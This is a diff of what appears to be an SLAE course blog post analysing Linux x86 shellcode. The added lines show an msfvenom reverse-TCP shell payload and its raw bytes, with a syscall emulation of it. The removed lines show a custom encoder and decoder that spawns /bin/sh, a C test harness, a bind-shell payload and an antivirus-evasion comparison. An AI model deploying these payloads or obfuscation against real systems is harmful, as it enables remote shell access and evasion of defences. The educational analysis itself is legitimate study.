@@ -201,160 +201,83 @@ The disassembled code consists of the following components:
 #### 2nd Shellcode (linux/x86/shell_reverse_tcp)
 --------------
 
-some stuff here :-)
-
-
-
-blah bla bla ... ->
-
-#### Assembly Code
--------------
-
-The Assembly code will consist of the following components:
-
-* Encoded shellcode
-* Decoder (Loop through the sequence of bytes 15 times - as the encoded shellcode is 30 bytes in length)
-* Decoded shellcode
-* Execution of decoded shellcode
-
-````nasm
-; Filename: enocder.nasm
-; Author: h3ll0clar1c3
-; Purpose: Decode the encoded shellcode and spawn a shell on the local host  
-; Compilation: ./compile.sh encoder
-; Usage: ./encoder
-; Shellcode size: 60 bytes
-; Architecture: x86
-
-global   _start
-
-section .text
-        _start:
-
-        ; jump to encoded shellcode
-        jmp short call_shellcode
-
-        decoder:
-        pop esi                         ; put address to EncodedShellcode into ESI (jmp-call-pop)
-        xor eax, eax                    ; clear eax register (data)
-        xor ecx, ecx                    ; clear ecx register (loop counter)
-        mov cl, 15                      ; loop 15 times (shellcode is 30 bytes in length)
-
-        decode:
-        ; switch data between esi and esi+1
-        mov  al, byte [esi]
-        xchg byte [esi+1], al
-        mov [esi], al
-
-        ; loop through each of the 2 bytes within the 4 byte segment and decode
-        add esi, 2
-        loop decode
-
-        ; jump to decoded shellcode
-        jmp short EncodedShellcode
-
-        call_shellcode:
-        call decoder
-        EncodedShellcode: db 0xc0,0x31,0x68,0x50,0x61,0x62,0x68,0x73,0x62,0x68,0x6e,0x69,0x68,0x2f,0x2f,0x2f,0x2f        	                     ,0x2f,0xe3,0x89,0x89,0x50,0x53,0xe2,0xe1,0x89,0x0b,0xb0,0x80,0xcd                                                             
-````
-
-The Assembly code is compiled by assembling with Nasm, and linking with the following bash script whilst outputting an executable binary:
+A Reverse TCP shell initiates a connection from the target host back to the attacker’s IP address and listening port, executing a shell on the target host’s machine (via the TCP protocol):
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ cat compile.sh
-#!/bin/bash
-
-echo '[+] Assembling with Nasm ... '
-nasm -f elf32 -o $1.o $1.nasm
-
-echo '[+] Linking ...'
-ld -o $1 $1.o
-
-echo '[+] Done!'
+osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f c
+No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+No Arch selected, selecting Arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 68 bytes
+Final size of c file: 311 bytes
+unsigned char buf[] = 
+"\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80"
+"\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\x68\x7f\x00\x00\x01\x68"
+"\x02\x00\x11\x5c\x89\xe1\xb0\x66\x50\x51\x53\xb3\x03\x89\xe1"
+"\xcd\x80\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3"
+"\x52\x53\x89\xe1\xb0\x0b\xcd\x80";
 ```
 
-The Assembly code compiled as an executable binary:
+The Sctest tool, part of the Libemu test suite, is used to inspect the program code and analyze the system calls:
 
 ```bash
-osboxes@osboxes:~/Downloads/SLAE$ ./compile.sh encoder
-[+] Assembling with Nasm ... 
-[+] Linking ...
-[+] Done!
+osboxes@osboxes:~/Downloads/SLAE$ msfvenom -p linux/x86/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | sctest -vvv -Ss 42
+<-- SNIPPET -->
+int socket (
+     int domain = 2;
+     int type = 1;
+     int protocol = 0;
+) =  14;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 2;
+) =  2;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 1;
+) =  1;
+int dup2 (
+     int oldfd = 14;
+     int newfd = 0;
+) =  0;
+int connect (
+     int sockfd = 14;
+     struct sockaddr_in * serv_addr = 0x00416fbe => 
+         struct   = {
+             short sin_family = 2;
+             unsigned short sin_port = 23569 (port=4444);
+             struct in_addr sin_addr = {
+                 unsigned long s_addr = 16777343 (host=127.0.0.1);
+             };
+             char sin_zero = "       ";
+         };
+     int addrlen = 102;
+) =  0;
+int execve (
+     const char * dateiname = 0x00416fa6 => 
+           = "//bin/sh";
+     const char * argv[] = [
+           = 0x00416f9e => 
+               = 0x00416fa6 => 
+                   = "//bin/sh";
+           = 0x00000000 => 
+             none;
+     ];
+     const char * envp[] = 0x00000000 => 
+         none;
+) =  0;
 ```
 
-#### Insertion Encoder in C
-------
+Sctest is used to emulate the specific instructions in the shellcode visually displaying the execution of the reverse shell payload. The parameters included in the Msfvenom payload are all visibly shown, the listening host, listening port and <code class="language-plaintext highlighter-rouge">/bin/sh</code> shell.
 
-Objdump is used to extract the shellcode from the Encoder in hex format (Null free):
+The required syscalls are also shown:
 
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ objdump -d ./encoder|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
-"\xeb\x15\x5e\x31\xc0\x31\xc9\xb1\x0f\x8a\x06\x86\x46\x01\x88\x06\x83\xc6\x02\xe2\xf4\xeb\x05\xe8\xe6\xff\xff\xff\xc0\x31\x68\x50\x61\x62\x68\x73\x62\x68\x6e\x69\x68\x2f\x2f\x2f\x2f\xe3\x89\x89\x50\x53\xe2\xe1\x89\x0b\xb0\x80\xcd"
-```
+* socket
+* dup2
+* connect
+* execve
 
-A C program scripted with the newly generated shellcode:
-
-```c
-/**
-* Filename: shellcode.c
-* Author: h3ll0clar1c3
-* Purpose: Decode the encoded shellcode and spawn a shell on the local host  
-* Compilation: gcc -fno-stack-protector -z execstack -m32 shellcode.c -o encoder_final  
-* Usage: ./encoder_final
-* Shellcode size: 60 bytes
-* Architecture: x86
-**/
-
-#include <stdio.h>
-#include <string.h>
-
-unsigned char decoder[] = \
-"\xeb\x17\x5e\x31\xc0\x31\xdb\x31\xc9\xb1\x0f\x8a\x06\x86\x46"
-"\x01\x88\x06\x83\xc6\x02\xe2\xf4\xeb\x05\xe8\xe4\xff\xff\xff"
-"\xc0\x31\x68\x50\x61\x62\x68\x73\x62\x68\x6e\x69\x68\x2f\x2f"
-"\x2f\x2f\x2f\xe3\x89\x89\x50\x53\xe2\xe1\x89\x0b\xb0\x80\xcd";
-
-int main()
-{
-        printf("Shellcode length:  %d\n", strlen(decoder));
-        int (*ret)() = (int(*)())decoder;
-        ret();
-}
-```
-
-#### POC  
-------
-
-The C program is compiled as an executable binary with stack-protection disabled, and executed resulting in a shellcode size of 60 bytes:
-
-```bash
-osboxes@osboxes:~/Downloads/SLAE$ gcc -fno-stack-protector -z execstack -m32 shellcode.c -o encoder_final
-osboxes@osboxes:~/Downloads/SLAE$ ./encoder_final 
-Shellcode length:  60
-osboxes@osboxes:/home/osboxes/Downloads/SLAE$ id
-uid=1000(osboxes) gid=1000(osboxes) groups=1000(osboxes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),109(lpadmin),124(sambashare)
- 
-```
-
-#### AV Evasion  
-------
-
-Expanding the POC and the notion of AV evasion, a Bind TCP shellcode generated by Msfvenom was incorporated into the Encoder to compare the result between the original (unobfuscated) and obfuscated shellcode binary analyzed on VirusTotal.
-
-<code class="language-plaintext highlighter-rouge">Msfvenom -p linux/x86/shell_bind_tcp</code>:
-
-```bash
-\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80
-
-```
-
-VirusTotal result of the original (unobfuscated) shellcode binary:
-
-![Encoder](/assets/images/original_virustotal.jpg)
-
-VirusTotal result of the obfuscated shellcode binary:
-
-![Encoder](/assets/images/obfuscated_virustotal.jpg)
+3rd shellcode :-) ...
 
 ##### SLAE Disclaimer ####
 ---------
